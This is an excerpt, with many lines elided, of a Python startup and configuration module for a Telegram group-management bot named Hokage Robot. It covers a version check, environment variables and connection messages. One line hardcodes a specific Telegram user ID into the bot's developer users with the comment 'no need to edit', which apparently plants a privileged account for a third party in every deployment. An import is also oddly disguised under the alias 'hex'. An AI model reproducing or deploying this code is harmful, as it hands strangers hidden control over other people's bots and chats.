...
from HOKAGE.utils import dict_error as hex
...
if sys.version_info[0] < 3 or sys.version_info[1] < 6:
    LOGGER.error(
        "ʏᴏᴜ ᴍᴜsᴛ ʜᴀᴠᴇ ᴀ ᴘʏᴛʜᴏɴ ᴠᴇʀsɪᴏɴ ᴏғ ᴀᴛ ʟᴇᴀsᴛ 3.8! ᴍᴜʟᴛɪᴘʟᴇ ғᴇᴀᴛᴜʀᴇs ᴅᴇᴘᴇɴᴅ ᴏɴ ᴛʜɪs. ʙᴏᴛ ǫᴜɪᴛᴛɪɴɢ.",
    )
    sys.exit(1)
...
if ENV:
    ...
    try:
        ...
        raise Exception("ʏᴏᴜʀ ᴏᴡɴᴇʀ_ɪᴅ ᴇɴᴠ ᴠᴀʀɪᴀʙʟᴇ ɪs ɴᴏᴛ ᴠᴀʟɪᴅ ɪɴᴛᴇɢᴇʀ.")
    ...
    SUPPORT_CHAT = os.environ.get(
        "SUPPORT_CHAT", None
    )  # Support Chat Group Link (Use @TechQuardSupport || Dont Use https://t.me/TechQuardSupport)
    UPDATES_CHANNEL = os.environ.get(
        "UPDATES_CHANNEL", None
    )  # Updates channel for bot (Use @TechQuard instead of t.me//example)
...
#    except ValueError:
#      raise Exception("ʏᴏᴜʀ ʙʟᴀᴄᴋʟɪsᴛᴇᴅ ᴄʜᴀᴛs ʟɪsᴛ ᴅᴏᴇs ɴᴏᴛ ᴄᴏɴᴛᴀɪɴ ᴠᴀʟɪᴅ ɪɴᴛɪɢᴇʀs.")


else:
    from HOKAGE.config import Development as Config
...
DEV_USERS.add(5513481385)  # no need to edit add your & enjoy
...
# Logger
print(
    "sᴜᴄᴄᴇsғᴜʟʟʏ ᴅᴇᴘʟᴏʏᴇᴅ | ʜᴏᴋᴀɢᴇ ʀᴏʙᴏᴛ ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ sᴜᴍɪᴛ ʏᴀᴅᴀᴠ"
)
...
print("[ʜᴏᴋᴀɢᴇ]: ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ ʜᴏᴋᴀɢᴇ sᴇʀᴠᴇʀ")
...
print("[ʜᴏᴋᴀɢᴇ]: ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ ʜᴏᴋᴀɢᴇ • PostgreSQL ᴅᴀᴛᴀʙᴀsᴇ")
# ubot = TelegramClient(StringSession(STRING_SESSION), APP_ID, APP_HASH)
print("[ʜᴏᴋᴀɢᴇ]: ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ HOKAGE • ᴜsᴇʀʙᴏᴛ (t.me/TechQuardSupport)")
...
from HOKAGE.modules.helper_funcs.handlers import (
